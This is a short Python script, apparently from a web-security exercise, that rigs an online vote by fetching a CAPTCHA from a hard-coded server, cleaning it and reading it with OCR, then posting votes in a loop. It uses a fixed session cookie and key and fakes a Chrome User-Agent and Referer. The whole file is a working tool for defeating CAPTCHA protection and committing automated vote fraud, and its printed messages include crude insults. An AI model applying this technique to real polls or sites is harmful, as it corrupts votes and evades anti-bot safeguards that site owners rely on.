#!/usr/bin/python3
from PIL import Image
import pytesseract
import requests
import io
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
def magical(img_file, limit=10):
        '''change black pixels to grey.'''
        img = Image.open(img_file)
        img = img.convert('RGB')
        pixel_data = img.load()

        for x in range(img.size[0]):
            for y in range(img.size[1]):
                if (pixel_data[x, y][0] < limit) \
                	    and (pixel_data[x, y][1] < limit) \
            	        and (pixel_data[x, y][2] < limit):
        	        pixel_data[x, y] = (0x80, 0x80, 0x80, 255)
        img.show()
        img.save('magical.png')
a = (input("who to vote for: "))
z = int(input("how any times kind sir?: "))
ID = a
d = 0
url = 'http://158.69.76.135/level5.php'
captcha_url = 'http://158.69.76.135/tim.php'
cookies = {
   	'HoldTheDoor': 'ba13e970668921817e93be7c5194d61a6122b640',
		}
agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
	(KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
headers = {'User-Agent': agent, 'Referer': url}
while d < z:
    s = requests.Session()
    s.headers.update(headers)
    response = s.get(captcha_url, headers=headers)
    f = open('captcha.png', 'wb')
    f.write(response.content)
    f.close()
    magical("captcha.png")
    x = \
    pytesseract.image_to_string(Image.open('magical.png'))

    data = {
     'id': ID,
     'holdthedoor': 'Submit',
     'key': 'ba13e970668921817e93be7c5194d61a6122b640',
     'captcha': x
	    }


    if x != "":
        print("hey! the captcha is: {}".format(x))
        a = s.post(url, data=data, cookies=cookies, headers=headers)
        d += 1
        print("vote count {}".format(d))
print("           DONE! \n     Hope you're happy you lazy fuck")

